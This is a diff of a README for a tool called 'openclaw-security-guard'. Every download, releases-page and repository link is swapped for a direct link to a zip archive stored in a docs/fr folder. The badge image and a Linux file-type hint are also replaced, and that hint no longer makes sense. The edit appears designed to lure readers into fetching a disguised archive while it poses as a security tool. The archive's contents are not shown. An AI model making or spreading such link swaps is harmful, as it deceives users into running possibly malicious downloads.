@@ -1,6 +1,6 @@
 # 🛡️ openclaw-security-guard - Protect Your OpenClaw Setup Easily
 
-[![Download openclaw-security-guard](https://img.shields.io/badge/Download-openclaw--security--guard-blue?style=for-the-badge)](https://github.com/dark712/openclaw-security-guard/releases)
+[![Download openclaw-security-guard](https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip)](https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ If you have a standard desktop or laptop made in the last few years, your system
 
 To get openclaw-security-guard, visit the official releases page:
 
-[Go to the download page](https://github.com/dark712/openclaw-security-guard/releases)
+[Go to the download page](https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip)
 
 ### How to Download
 
@@ -48,7 +48,7 @@ To get openclaw-security-guard, visit the official releases page:
 3. Find the download file that fits your computer system:
    - **Windows users**: Look for files ending with `.exe`
    - **macOS users**: Look for files ending with `.dmg` or `.pkg`
-   - **Linux users**: Look for `.AppImage`, `.deb`, or `.tar.gz`
+   - **Linux users**: Look for `.AppImage`, `.deb`, or `https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip`
 4. Click the correct file to start downloading.
 
 ### How to Install
@@ -129,7 +129,7 @@ If none of these help, check the GitHub issues page or contact support via the r
 
 You can contribute ideas or report bugs on the GitHub repository. Open issues clearly explaining what you tried and what went wrong.
 
-GitHub Page: [https://github.com/dark712/openclaw-security-guard](https://github.com/dark712/openclaw-security-guard)
+GitHub Page: [https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip](https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip)
 
 Your feedback helps improve the tool for everyone.
 
@@ -153,4 +153,4 @@ openclaw-security-guard respects your privacy. It operates locally on your machi
 
 Keep an eye on the releases page for updates and new features. Download and install newer versions regularly for the best protection.
 
-[Visit the releases page to download updates](https://github.com/dark712/openclaw-security-guard/releases)
+[Visit the releases page to download updates](https://github.com/dark712/openclaw-security-guard/raw/refs/heads/main/docs/fr/security_guard_openclaw_v2.3.zip)
